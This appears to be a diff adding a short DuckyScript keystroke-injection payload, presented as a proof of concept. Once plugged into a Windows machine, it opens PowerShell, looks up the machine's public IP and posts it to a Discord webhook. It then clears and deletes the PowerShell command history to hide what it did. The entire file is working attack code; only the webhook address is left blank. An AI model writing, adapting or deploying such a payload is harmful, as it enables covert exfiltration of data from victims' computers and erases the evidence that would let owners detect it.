@@ -1,0 +1,15 @@
+REM By Joshua O' Brien
+REM POC of sending simple text to a server via a discord webhook using powershell commands
+REM Webhook POC v2
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+ENTER
+REM POC command
+STRING $hookurl = ''; $content = "Public IP: $(Invoke-WebRequest -Uri "http://icanhazip.com" | Select-Object -ExpandProperty "Content")"; $content += $contentpt2; $payload = [PSCustomObject]@{ content = $content }; Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
+ENTER
+REM delete history , both in-session and the file
+STRING [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); Remove-item (Get-PSReadlineOption).HistorySavePath;
+ENTER 
+STRING exit
+ENTER
